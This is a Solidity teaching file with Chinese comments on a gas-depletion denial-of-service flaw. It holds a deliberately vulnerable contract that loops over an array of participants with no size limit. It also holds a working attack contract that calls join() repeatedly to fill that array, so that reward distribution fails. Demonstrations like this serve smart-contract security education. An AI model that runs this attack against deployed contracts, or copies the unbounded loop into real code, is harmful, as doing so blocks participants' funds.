pragma solidity >=0.8.0;

// SPDX-License-Identifier: UNLICENSED

// 漏洞描述：
// 此合約為一個典型的 Gas Depletion 漏洞示範。攻擊者可以透過不斷呼叫 join() 函式，將參與者清單無限制增加，
// 當 distributeRewards() 函式嘗試遍歷 participant 陣列時，由於陣列過大會導致迴圈消耗大量 gas，可能引發整個交易失敗。
// 攻擊手法：
// 1. 攻擊者反覆呼叫 join() 函式，提供固定 0.01 ETH，將參與者陣列充塞大量資料。
// 2. 當受害者或發起者呼叫 distributeRewards() 時，因為陣列過長而使 gas 消耗殆盡，導致交易失敗，進而造成拒絕服務攻擊。

contract GasDepletionVulnerable {
    // 狀態變數：存放所有參與者的地址（漏洞重點：無限制增加的陣列）
    address[] public participants;

    // 參與者加入合約，支付 0.01 ETH 後加入參與者清單
    function join() public payable {
        require(msg.value == 0.01 ether, "Invalid value");
        participants.push(msg.sender); // 漏洞重點
    }

    // 分配獎勵給所有參與者; 使用 for 迴圈遍歷全員
    function distributeRewards() public {
        require(participants.length > 0, "No participants");
        uint256 reward = address(this).balance / participants.length;
        // 當 participants 陣列過大時，for 迴圈會消耗過多 gas
        for (uint i = 0; i < participants.length; i++) {
            payable(participants[i]).transfer(reward);
        }
    }

    // 接收 Ether 的 fallback 功能
    receive() external payable {}
}

// 攻擊合約範例：
// 攻擊者利用多次呼叫 join() 函式充塞 participants 陣列，使得 distributeRewards() 在呼叫時因 gas 消耗過多而失敗。

contract GasDepletionAttack {
    GasDepletionVulnerable public vulnerableContract;

    // 修正前的錯誤在此處：
    // 原本嘗試直接從 address 轉換到 contract，但因為合約有 payable fallback，所以必須使用 payable address 進行轉換。
    // 因此，此處改用 payable(_vulnerableAddress) 來修正編譯錯誤。
    constructor(address _vulnerableAddress) {
        vulnerableContract = GasDepletionVulnerable(payable(_vulnerableAddress));
    }

    // 攻擊函式：重複呼叫 join()，無限增長 participants 陣列
    function attack(uint256 times) public payable {
        // 每次呼叫 join() 需傳入 0.01 ETH，因此總共需傳入 times * 0.01 ETH
        require(msg.value == times * 0.01 ether, "Invalid total ETH sent");
        for (uint256 i = 0; i < times; i++) {
            vulnerableContract.join{value: 0.01 ether}();
        }
    }
}
